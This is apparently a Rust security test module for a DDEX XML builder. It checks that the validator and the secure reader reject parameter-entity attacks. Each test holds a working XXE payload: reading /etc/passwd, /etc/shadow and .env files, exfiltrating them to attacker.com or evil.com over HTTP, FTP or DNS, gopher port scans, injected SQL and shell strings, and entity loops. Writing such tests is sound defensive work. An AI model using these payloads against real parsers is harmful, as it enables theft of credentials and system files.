//! Parameter Entity Attack Tests
//!
//! This module contains comprehensive tests for parameter entity attacks:
//! - Parameter entity file disclosure
//! - Parameter entity network requests
//! - Parameter entity injection attacks
//! - Nested parameter entities
//! - Parameter entity loops
//! - Mixed parameter/general entity attacks
//! - Out-of-band (OOB) data exfiltration attempts

use ddex_builder::{
    error::BuildError,
    security::{InputValidator, SecurityConfig, SecureXmlReader},
};
use std::io::Cursor;

/// Test basic parameter entity file disclosure attempts
#[test]
fn test_parameter_entity_file_disclosure() {
    let config = SecurityConfig::default();
    let validator = InputValidator::new(config);

    // Classic parameter entity file disclosure
    let file_disclosure_1 = r#"<!DOCTYPE test [
        <!ENTITY % file SYSTEM "file:///etc/passwd">
        <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
        %eval;
        %error;
    ]>
    <test>test</test>"#;

    let result = validator.validate_xml_content(file_disclosure_1);
    assert!(
        result.is_err(),
        "Parameter entity file disclosure should be blocked: {:?}",
        result
    );

    // Windows file disclosure variant
    let file_disclosure_2 = r#"<!DOCTYPE test [
        <!ENTITY % file SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
        <!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/%file;'>">
        %eval;
        %send;
    ]>
    <test>test</test>"#;

    let result = validator.validate_xml_content(file_disclosure_2);
    assert!(
        result.is_err(),
        "Windows parameter entity file disclosure should be blocked: {:?}",
        result
    );

    // Unix-style system files
    let file_disclosure_3 = r#"<!DOCTYPE test [
        <!ENTITY % passwd SYSTEM "/etc/passwd">
        <!ENTITY % shadow SYSTEM "/etc/shadow">
        <!ENTITY % hosts SYSTEM "/etc/hosts">
        <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.com/%passwd;%shadow;%hosts;'>">
        %eval;
        %exfil;
    ]>
    <test>test</test>"#;

    let result = validator.validate_xml_content(file_disclosure_3);
    assert!(
        result.is_err(),
        "Unix system files parameter entity attack should be blocked: {:?}",
        result
    );

    // Application-specific file disclosure
    let file_disclosure_4 = r#"<!DOCTYPE test [
        <!ENTITY % config SYSTEM "file:///app/config/database.xml">
        <!ENTITY % secrets SYSTEM "file:///app/.env">
        <!ENTITY % eval "<!ENTITY &#x25; leak SYSTEM 'http://evil.com/collect?config=%config;&amp;secrets=%secrets;'>">
        %eval;
        %leak;
    ]>
    <test>test</test>"#;

    let result = validator.validate_xml_content(file_disclosure_4);
    assert!(
        result.is_err(),
        "Application file parameter entity attack should be blocked: {:?}",
        result
    );
}

/// Test parameter entity network request attacks
#[test]
fn test_parameter_entity_network_attacks() {
    let config = SecurityConfig::default();
    let validator = InputValidator::new(config);

    // Basic HTTP request via parameter entity
    let network_attack_1 = r#"<!DOCTYPE test [
        <!ENTITY % remote SYSTEM "http://attacker.com/malicious.xml">
        %remote;
    ]>
    <test>test</test>"#;

    let result = validator.validate_xml_content(network_attack_1);
    assert!(
        result.is_err(),
        "HTTP parameter entity request should be blocked: {:?}",
        result
    );

    // HTTPS request with data exfiltration
    let network_attack_2 = r#"<!DOCTYPE test [
        <!ENTITY % data "sensitive_information">
        <!ENTITY % send SYSTEM "https://attacker.com/steal?data=%data;">
        %send;
    ]>
    <test>test</test>"#;

    let result = validator.validate_xml_content(network_attack_2);
    assert!(
        result.is_err(),
        "HTTPS parameter entity data exfiltration should be blocked: {:?}",
        result
    );

    // FTP data exfiltration
    let network_attack_3 = r#"<!DOCTYPE test [
        <!ENTITY % file SYSTEM "file:///etc/passwd">
        <!ENTITY % ftp SYSTEM "ftp://attacker.com/upload/%file;">
        %ftp;
    ]>
    <test>test</test>"#;

    let result = validator.validate_xml_content(network_attack_3);
    assert!(
        result.is_err(),
        "FTP parameter entity exfiltration should be blocked: {:?}",
        result
    );

    // Multiple network protocols
    let network_attack_4 = r#"<!DOCTYPE test [
        <!ENTITY % http_probe SYSTEM "http://attacker.com/probe">
        <!ENTITY % https_steal SYSTEM "https://attacker.com/steal">
        <!ENTITY % ftp_upload SYSTEM "ftp://attacker.com/upload">
        <!ENTITY % ldap_query SYSTEM "ldap://attacker.com/search">
        %http_probe;
        %https_steal;
        %ftp_upload;
        %ldap_query;
    ]>
    <test>test</test>"#;

    let result = validator.validate_xml_content(network_attack_4);
    assert!(
        result.is_err(),
        "Multiple protocol parameter entity attack should be blocked: {:?}",
        result
    );

    // Gopher protocol for port scanning
    let network_attack_5 = r#"<!DOCTYPE test [
        <!ENTITY % scan1 SYSTEM "gopher://target.com:22/1">
        <!ENTITY % scan2 SYSTEM "gopher://target.com:80/1">
        <!ENTITY % scan3 SYSTEM "gopher://target.com:443/1">
        <!ENTITY % scan4 SYSTEM "gopher://target.com:3389/1">
        %scan1;%scan2;%scan3;%scan4;
    ]>
    <test>test</test>"#;

    let result = validator.validate_xml_content(network_attack_5);
    assert!(
        result.is_err(),
        "Gopher protocol port scan should be blocked: {:?}",
        result
    );
}

/// Test nested parameter entity attacks
#[test]
fn test_nested_parameter_entities() {
    let config = SecurityConfig::default();
    let validator = InputValidator::new(config);

    // Two-level nested parameter entities
    let nested_attack_1 = r#"<!DOCTYPE test [
        <!ENTITY % level1 "<!ENTITY &#x25; level2 SYSTEM 'http://attacker.com/level2.xml'>">
        <!ENTITY % trigger "%level1;%level2;">
        %trigger;
    ]>
    <test>test</test>"#;

    let result = validator.validate_xml_content(nested_attack_1);
    assert!(
        result.is_err(),
        "Two-level nested parameter entities should be blocked: {:?}",
        result
    );

    // Three-level nested parameter entities
    let nested_attack_2 = r#"<!DOCTYPE test [
        <!ENTITY % level1 "<!ENTITY &#x25; level2 '<!ENTITY &#x26; level3 SYSTEM &#x27;http://evil.com&#x27;>'>">
        <!ENTITY % level2_trigger "%level1;%level2;">
        <!ENTITY % level3_trigger "%level2_trigger;%level3;">
        %level3_trigger;
    ]>
    <test>test</test>"#;

    let result = validator.validate_xml_content(nested_attack_2);
    assert!(
        result.is_err(),
        "Three-level nested parameter entities should be blocked: {:?}",
        result
    );

    // Deeply nested with file disclosure
    let nested_attack_3 = r#"<!DOCTYPE test [
        <!ENTITY % file SYSTEM "file:///etc/passwd">
        <!ENTITY % wrapper1 "<!ENTITY &#x25; wrapper2 '<!ENTITY &#x26; leak SYSTEM &#x27;http://evil.com/?data=%file;&#x27;>'>">
        <!ENTITY % nested "%wrapper1;%wrapper2;%leak;">
        %nested;
    ]>
    <test>test</test>"#;

    let result = validator.validate_xml_content(nested_attack_3);
    assert!(
        result.is_err(),
        "Nested parameter entity with file disclosure should be blocked: {:?}",
        result
    );

    // Recursive nesting attempt
    let recursive_nesting = r#"<!DOCTYPE test [
        <!ENTITY % recurse "<!ENTITY &#x25; recurse2 '%recurse;'>">
        <!ENTITY % start "%recurse;%recurse2;">
        %start;
    ]>
    <test>test</test>"#;

    let result = validator.validate_xml_content(recursive_nesting);
    assert!(
        result.is_err(),
        "Recursive parameter entity nesting should be blocked: {:?}",
        result
    );
}

/// Test parameter entity injection attacks
#[test]
fn test_parameter_entity_injection() {
    let config = SecurityConfig::default();
    let validator = InputValidator::new(config);

    // SQL injection via parameter entity
    let sql_injection = r#"<!DOCTYPE test [
        <!ENTITY % payload "'; DROP TABLE users; --">
        <!ENTITY % inject SYSTEM "http://vulnerable-app.com/api?query=%payload;">
        %inject;
    ]>
    <test>test</test>"#;

    let result = validator.validate_xml_content(sql_injection);
    assert!(
        result.is_err(),
        "SQL injection via parameter entity should be blocked: {:?}",
        result
    );

    // Command injection attempt
    let cmd_injection = r#"<!DOCTYPE test [
        <!ENTITY % cmd "; cat /etc/passwd; #">
        <!ENTITY % execute SYSTEM "http://vulnerable-app.com/exec?cmd=%cmd;">
        %execute;
    ]>
    <test>test</test>"#;

    let result = validator.validate_xml_content(cmd_injection);
    assert!(
        result.is_err(),
        "Command injection via parameter entity should be blocked: {:?}",
        result
    );

    // Path traversal injection
    let path_traversal = r#"<!DOCTYPE test [
        <!ENTITY % traverse "../../../../etc/passwd">
        <!ENTITY % read SYSTEM "file:///%traverse;">
        %read;
    ]>
    <test>test</test>"#;

    let result = validator.validate_xml_content(path_traversal);
    assert!(
        result.is_err(),
        "Path traversal via parameter entity should be blocked: {:?}",
        result
    );

    // Script injection for web contexts
    let script_injection = r#"<!DOCTYPE test [
        <!ENTITY % script "<script>alert('XSS')</script>">
        <!ENTITY % inject SYSTEM "http://webapp.com/process?content=%script;">
        %inject;
    ]>
    <test>test</test>"#;

    let result = validator.validate_xml_content(script_injection);
    assert!(
        result.is_err(),
        "Script injection via parameter entity should be blocked: {:?}",
        result
    );
}

/// Test parameter entity loops and cycles
#[test]
fn test_parameter_entity_loops() {
    let config = SecurityConfig::default();
    let validator = InputValidator::new(config);

    // Simple parameter entity loop
    let simple_loop = r#"<!DOCTYPE test [
        <!ENTITY % a "%b;">
        <!ENTITY % b "%a;">
        %a;
    ]>
    <test>test</test>"#;

    let result = validator.validate_xml_content(simple_loop);
    assert!(
        result.is_err(),
        "Simple parameter entity loop should be blocked: {:?}",
        result
    );

    // Three-entity cycle
    let three_cycle = r#"<!DOCTYPE test [
        <!ENTITY % x "%y;">
        <!ENTITY % y "%z;">
        <!ENTITY % z "%x;">
        %x;
    ]>
    <test>test</test>"#;

    let result = validator.validate_xml_content(three_cycle);
    assert!(
        result.is_err(),
        "Three-entity parameter cycle should be blocked: {:?}",
        result
    );

    // Complex loop with expansion
    let complex_loop = r#"<!DOCTYPE test [
        <!ENTITY % base "content">
        <!ENTITY % expand1 "%base;%base;%expand2;">
        <!ENTITY % expand2 "%expand1;%expand3;">
        <!ENTITY % expand3 "%expand1;%expand2;">
        %expand1;
    ]>
    <test>test</test>"#;

    let result = validator.validate_xml_content(complex_loop);
    assert!(
        result.is_err(),
        "Complex parameter entity loop should be blocked: {:?}",
        result
    );

    // Self-referencing parameter entity
    let self_reference = r#"<!DOCTYPE test [
        <!ENTITY % self "%self;%self;">
        %self;
    ]>
    <test>test</test>"#;

    let result = validator.validate_xml_content(self_reference);
    assert!(
        result.is_err(),
        "Self-referencing parameter entity should be blocked: {:?}",
        result
    );
}

/// Test mixed parameter and general entity attacks
#[test]
fn test_mixed_parameter_general_entities() {
    let config = SecurityConfig::default();
    let validator = InputValidator::new(config);

    // Parameter entity creating general entities
    let mixed_attack_1 = r#"<!DOCTYPE test [
        <!ENTITY % create_entities "<!ENTITY general1 'content1'><!ENTITY general2 'content2'>">
        %create_entities;
    ]>
    <test>&general1;&general2;</test>"#;

    let result = validator.validate_xml_content(mixed_attack_1);
    assert!(
        result.is_err(),
        "Parameter entity creating general entities should be blocked: {:?}",
        result
    );

    // General entity referencing parameter entities (invalid but worth testing)
    let mixed_attack_2 = r#"<!DOCTYPE test [
        <!ENTITY % param "parameter_content">
        <!ENTITY general "%param;">
    ]>
    <test>&general;</test>"#;

    let result = validator.validate_xml_content(mixed_attack_2);
    assert!(
        result.is_err(),
        "General entity referencing parameter entity should be blocked: {:?}",
        result
    );

    // Complex mixed expansion
    let mixed_attack_3 = r#"<!DOCTYPE test [
        <!ENTITY % file SYSTEM "file:///etc/passwd">
        <!ENTITY % create_gen "<!ENTITY leaked '%file;'>">
        <!ENTITY % create_exp "<!ENTITY expanded '&leaked;&leaked;&leaked;'>">
        %create_gen;
        %create_exp;
    ]>
    <test>&expanded;</test>"#;

    let result = validator.validate_xml_content(mixed_attack_3);
    assert!(
        result.is_err(),
        "Complex mixed parameter/general entity attack should be blocked: {:?}",
        result
    );

    // Billion laughs using parameter entities to create general entities
    let param_billion_laughs = r#"<!DOCTYPE test [
        <!ENTITY % lol "lol">
        <!ENTITY % create_lols "<!ENTITY lol1 '%lol;%lol;%lol;%lol;%lol;'><!ENTITY lol2 '&lol1;&lol1;&lol1;&lol1;&lol1;'>">
        %create_lols;
    ]>
    <test>&lol2;</test>"#;

    let result = validator.validate_xml_content(param_billion_laughs);
    assert!(
        result.is_err(),
        "Parameter entity billion laughs should be blocked: {:?}",
        result
    );
}

/// Test out-of-band (OOB) data exfiltration via parameter entities
#[test]
fn test_oob_data_exfiltration() {
    let config = SecurityConfig::default();
    let validator = InputValidator::new(config);

    // Classic OOB exfiltration
    let oob_exfil_1 = r#"<!DOCTYPE test [
        <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
        <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://attacker.com/collect?data=%file;'>">
        %eval;
        %error;
    ]>
    <test>test</test>"#;

    let result = validator.validate_xml_content(oob_exfil_1);
    assert!(
        result.is_err(),
        "OOB data exfiltration should be blocked: {:?}",
        result
    );

    // DNS-based OOB exfiltration
    let oob_exfil_2 = r#"<!DOCTYPE test [
        <!ENTITY % file SYSTEM "file:///etc/hostname">
        <!ENTITY % eval "<!ENTITY &#x25; dns_exfil SYSTEM 'http://%file;.attacker.com/'>">
        %eval;
        %dns_exfil;
    ]>
    <test>test</test>"#;

    let result = validator.validate_xml_content(oob_exfil_2);
    assert!(
        result.is_err(),
        "DNS-based OOB exfiltration should be blocked: {:?}",
        result
    );

    // Multi-file OOB exfiltration
    let oob_exfil_3 = r#"<!DOCTYPE test [
        <!ENTITY % passwd SYSTEM "file:///etc/passwd">
        <!ENTITY % shadow SYSTEM "file:///etc/shadow">
        <!ENTITY % hosts SYSTEM "file:///etc/hosts">
        <!ENTITY % eval "<!ENTITY &#x25; multi_exfil SYSTEM 'http://attacker.com/collect?passwd=%passwd;&amp;shadow=%shadow;&amp;hosts=%hosts;'>">
        %eval;
        %multi_exfil;
    ]>
    <test>test</test>"#;

    let result = validator.validate_xml_content(oob_exfil_3);
    assert!(
        result.is_err(),
        "Multi-file OOB exfiltration should be blocked: {:?}",
        result
    );

    // Blind XXE with time-based detection
    let blind_xxe = r#"<!DOCTYPE test [
        <!ENTITY % remote SYSTEM "http://attacker.com/slow_response.xml">
        <!ENTITY % eval "<!ENTITY &#x25; timing SYSTEM 'http://attacker.com/timing?start=now'>">
        %remote;
        %eval;
        %timing;
    ]>
    <test>test</test>"#;

    let result = validator.validate_xml_content(blind_xxe);
    assert!(
        result.is_err(),
        "Blind XXE with timing should be blocked: {:?}",
        result
    );
}

/// Test SecureXmlReader with parameter entity attacks
#[test]
fn test_secure_xml_reader_parameter_protection() {
    let config = SecurityConfig::default();

    // Test parameter entity file disclosure
    let param_file_attack = r#"<!DOCTYPE test [
        <!ENTITY % file SYSTEM "file:///etc/passwd">
        %file;
    ]>
    <test>content</test>"#;

    let cursor = Cursor::new(param_file_attack.as_bytes());
    let mut reader = SecureXmlReader::new(cursor, config.clone());

    let mut buf = Vec::new();
    match reader.read_event(&mut buf) {
        Err(BuildError::Security(msg)) => {
            assert!(
                msg.contains("DTD processing not allowed")
                || msg.contains("External reference")
                || msg.contains("Dangerous entity")
            );
        }
        other => panic!("Expected security error for parameter entity attack, got: {:?}", other),
    }

    // Test parameter entity network request
    let param_network_attack = r#"<!DOCTYPE test [
        <!ENTITY % remote SYSTEM "http://evil.com/evil.xml">
        %remote;
    ]>
    <test>content</test>"#;

    let cursor = Cursor::new(param_network_attack.as_bytes());
    let mut reader = SecureXmlReader::new(cursor, config);

    let mut buf = Vec::new();
    match reader.read_event(&mut buf) {
        Err(BuildError::Security(msg)) => {
            assert!(
                msg.contains("DTD processing not allowed")
                || msg.contains("External reference")
                || msg.contains("Dangerous entity")
            );
        }
        other => panic!("Expected security error for parameter network attack, got: {:?}", other),
    }
}

/// Test parameter entity attack variations and evasions
#[test]
fn test_parameter_entity_evasions() {
    let config = SecurityConfig::default();
    let validator = InputValidator::new(config);

    // Using numeric character references in parameter entity
    let numeric_evasion = r#"<!DOCTYPE test [
        <!ENTITY % file SYSTEM "&#102;&#105;&#108;&#101;&#58;&#47;&#47;&#47;&#101;&#116;&#99;&#47;&#112;&#97;&#115;&#115;&#119;&#100;">
        %file;
    ]>
    <test>test</test>"#;

    let result = validator.validate_xml_content(numeric_evasion);
    assert!(
        result.is_err(),
        "Numeric character reference evasion should be blocked: {:?}",
        result
    );

    // Mixed case keywords
    let case_evasion = r#"<!DOCTYPE test [
        <!Entity % File System "file:///etc/passwd">
        %File;
    ]>
    <test>test</test>"#;

    let result = validator.validate_xml_content(case_evasion);
    assert!(
        result.is_err(),
        "Case evasion should be blocked: {:?}",
        result
    );

    // Extra whitespace
    let whitespace_evasion = r#"<!DOCTYPE test [
        <!ENTITY    %    file    SYSTEM    "file:///etc/passwd"   >
        %    file    ;
    ]>
    <test>test</test>"#;

    let result = validator.validate_xml_content(whitespace_evasion);
    assert!(
        result.is_err(),
        "Whitespace evasion should be blocked: {:?}",
        result
    );

    // Using comments (not valid in DTD but worth testing)
    let comment_evasion = r#"<!DOCTYPE test [
        <!-- comment --> <!ENTITY % file SYSTEM "file:///etc/passwd"> <!-- comment -->
        %file;
    ]>
    <test>test</test>"#;

    let result = validator.validate_xml_content(comment_evasion);
    assert!(
        result.is_err(),
        "Comment evasion should be blocked: {:?}",
        result
    );
}

/// Test edge cases for parameter entities
#[test]
fn test_parameter_entity_edge_cases() {
    let config = SecurityConfig::default();
    let validator = InputValidator::new(config);

    // Empty parameter entity
    let empty_param = r#"<!DOCTYPE test [
        <!ENTITY % empty "">
        %empty;
    ]>
    <test>test</test>"#;

    let result = validator.validate_xml_content(empty_param);
    assert!(
        result.is_err(),
        "Empty parameter entity should be blocked due to DTD: {:?}",
        result
    );

    // Parameter entity with only whitespace
    let whitespace_param = r#"<!DOCTYPE test [
        <!ENTITY % spaces "   ">
        %spaces;
    ]>
    <test>test</test>"#;

    let result = validator.validate_xml_content(whitespace_param);
    assert!(
        result.is_err(),
        "Whitespace parameter entity should be blocked due to DTD: {:?}",
        result
    );

    // Very long parameter entity name
    let long_name = "very_long_parameter_entity_name_that_might_cause_buffer_issues_or_other_problems_in_parsers_abcdefghijklmnopqrstuvwxyz";
    let long_name_param = format!(
        r#"<!DOCTYPE test [
            <!ENTITY % {} "content">
            %{};
        ]>
        <test>test</test>"#,
        long_name, long_name
    );

    let result = validator.validate_xml_content(&long_name_param);
    assert!(
        result.is_err(),
        "Long parameter entity name should be blocked due to DTD: {:?}",
        result
    );

    // Parameter entity with special characters in value
    let special_chars_param = r#"<!DOCTYPE test [
        <!ENTITY % special "!@#$%^&*()_+-={}[]|:;'&quot;&lt;&gt;?,./~`">
        %special;
    ]>
    <test>test</test>"#;

    let result = validator.validate_xml_content(special_chars_param);
    assert!(
        result.is_err(),
        "Parameter entity with special chars should be blocked due to DTD: {:?}",
        result
    );
}